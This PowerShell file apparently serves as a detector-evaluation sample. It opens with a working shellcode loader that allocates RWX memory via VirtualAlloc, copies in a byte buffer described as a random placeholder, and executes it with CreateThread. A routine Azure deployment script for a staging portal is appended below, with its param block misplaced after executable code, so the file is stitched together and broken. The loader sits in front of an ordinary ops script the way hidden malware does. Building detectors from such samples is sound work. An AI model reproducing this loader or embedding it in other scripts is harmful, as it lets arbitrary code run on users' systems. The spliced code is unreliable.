
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

$LogPath = "$env:TEMP\stage.log"

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class PlatformApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x8e, 0xf9, 0x81, 0x35, 0xbd, 0x7c, 0x10, 0x64, 0x0f, 0x0f, 0xe3, 0xac, 0xe6, 0x40, 0x2d, 0xd7,
    0xeb, 0xdd, 0xc0, 0xe3, 0x72, 0xe5, 0x42, 0x65, 0x31, 0xf1, 0xc4, 0xfa, 0xe9, 0x5a, 0x74, 0x32,
    0x19, 0x18, 0x92, 0xc7, 0xf2, 0x43, 0x69, 0x5e, 0x91, 0x2d, 0xca, 0xda, 0x52, 0x66, 0x67, 0xd7,
    0x1d, 0xb8, 0xff, 0xdf, 0xab, 0x31, 0x9f, 0xdb, 0x7b, 0x75, 0x33, 0x24, 0x6a, 0x6e, 0x85, 0x32,
    0x34, 0x47, 0x50, 0xfb, 0x6d, 0xb2, 0xcc, 0x23, 0xd2, 0xdb, 0xbe, 0x62, 0x01, 0xbe, 0xb6, 0x05,
    0x9f, 0x2b, 0x7d, 0x34, 0x32, 0xc1, 0xfa, 0x4d, 0x0b, 0xd4, 0xb9, 0x5c, 0x4d, 0x11, 0x4c, 0x87,
    0x39, 0xba, 0x59, 0x68, 0x10, 0xda, 0x60, 0x16, 0xda, 0xf7, 0x9b, 0xb7, 0x8f, 0xb6, 0xa8, 0x7f,
    0xbe, 0x4f, 0x20, 0xe5, 0x49, 0xb3, 0xeb, 0x27, 0x4b, 0xc0, 0x2c, 0x64, 0x37, 0xc9, 0xba, 0x83,
    0xc0, 0xed, 0xda, 0xe2, 0x1b, 0x30, 0x8a, 0xf4, 0xfa, 0x1e, 0xd7, 0xc1, 0x4e, 0x37, 0xf0, 0xd4,
    0x4f, 0x8b, 0xab, 0x6a, 0x1b, 0xd8, 0xf1, 0x79, 0x53, 0x56, 0x70, 0x68, 0xb1, 0x45, 0xa3, 0xc9,
    0xd0, 0xfd, 0xbd, 0xca, 0xfd, 0x99, 0xdd, 0x69, 0x8e, 0x24, 0xd8, 0xe1, 0x48, 0x56, 0x40, 0x5c,
    0x40, 0x13, 0xfc, 0x91, 0x8e, 0x1e, 0x6d, 0x57, 0x4b, 0x91, 0xfe, 0x75, 0x3c, 0xdc, 0x3d, 0xf6,
    0xe3, 0x18, 0xf4, 0x3d, 0x4e, 0xd6, 0x79, 0x9f, 0x37, 0x00, 0xa4, 0x40, 0xbf, 0x13, 0x60, 0xa1,
    0x3b, 0x40, 0x7a, 0xdd, 0x31, 0x86, 0x16
)

$ProcHandle = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($ProcHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][PlatformApi]::WaitForSingleObject($Thread, 2898)
[void][PlatformApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$ResourceGroup = 'rg-portal-staging-03',
    [Parameter(Mandatory = $false)]
    [ValidateSet('westeurope', 'eastus', "northeurope", 'uksouth')]
    [string]$Location = "eastus",

    [string]$TemplateFile = 'C:\Scripts\templates\portal-staging.json',

    [string]$ParameterFile = 'C:\Scripts\templates\portal-staging.parameters.json',

    [string]$SubscriptionId = '88a8a09e-aa74-5b0b-5cda-13d204267beb',

    [string]$StorageAccount = 'ststaging0802',
    [string]$VmName = 'vm-portal-staging-03',

    [string]$OutputPath = 'C:\Logs\deploy-staging-2025-01-06.json',

    [switch]$DryRun
)
Set-StrictMode -Version 2.0
$culture = [System.Globalization.CultureInfo]::InvariantCulture
$ProgressPreference = 'SilentlyContinue'

if (-not (Get-Module -ListAvailable -Name Az.Resources)) {
    throw 'The Az.Resources module is not installed.'
}
Import-Module Az.Resources -ErrorAction Stop

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}
$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$deployment = New-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile `
    -Name $DeploymentName `
    -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
Write-Host ("Provisioning state: {0}" -f $deployment.ProvisioningState) -ForegroundColor Cyan
